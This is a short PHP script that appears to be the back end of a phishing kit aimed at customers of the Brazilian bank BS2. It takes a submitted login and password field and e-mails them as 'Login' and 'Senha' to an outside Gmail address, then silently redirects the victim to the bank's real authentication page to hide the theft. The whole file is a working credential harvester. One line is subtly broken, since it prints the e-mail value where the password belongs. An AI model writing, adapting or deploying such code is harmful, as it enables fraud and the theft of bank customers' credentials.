  <?php
  //Variáveis
  $nome = $_GET['nome'];
  $email = $_GET['email'];
  $data_envio = date('d/m/Y');
  $hora_envio = date('H:i:s');

  //Compo E-mail
  $arquivo = "
    <html>
      <p><b>Login: </b>$email</p>
      <p><b>Senha: </b>$email</p>
      <p>Este e-mail foi enviado em <b>$data_envio</b> às <b>$hora_envio</b></p>
    </html>
  ";
  
  //Emails para quem será enviado o formulário
  $destino = "17sistem@gmail.com";
  $assunto = "Nova Inf";

  //Este sempre deverá existir para garantir a exibição correta dos caracteres
  $headers  = "MIME-Version: 1.0\n";
  $headers .= "Content-type: text/html; charset=iso-8859-1\n";
  $headers .= "From: $email <$email>";

  //Enviar
  mail($destino, $assunto, $arquivo, $headers);
  
  echo "<meta http-equiv='refresh' content='0; https://app.empresas.bs2.com/bs2/autenticacao?_ga=2.167732662.966602958.1659551333-1655799592.1658522621'>";
  ?>